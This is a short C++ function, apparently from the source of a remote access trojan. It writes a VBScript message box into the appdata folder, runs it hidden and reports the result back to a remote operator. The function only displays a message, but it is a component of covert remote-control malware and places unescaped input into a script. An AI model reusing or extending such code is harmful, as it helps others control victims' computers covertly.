void vbsMessageBox(string message)
{
    string location = appdata + "/msg.vbs";
    ofstream VBS_FILE(location);

    VBS_FILE << "MsgBox (\"" + message + "\"), 64, \"[Message]\"";
    VBS_FILE.close();

    if (ShellExecuteA(NULL, "open", location.data(), NULL, NULL, 0)) {
        sendall("[+] Message Sent");
    
    } else sendall("[!] Unable to Display Message");

    fileLog.push_back(location);
}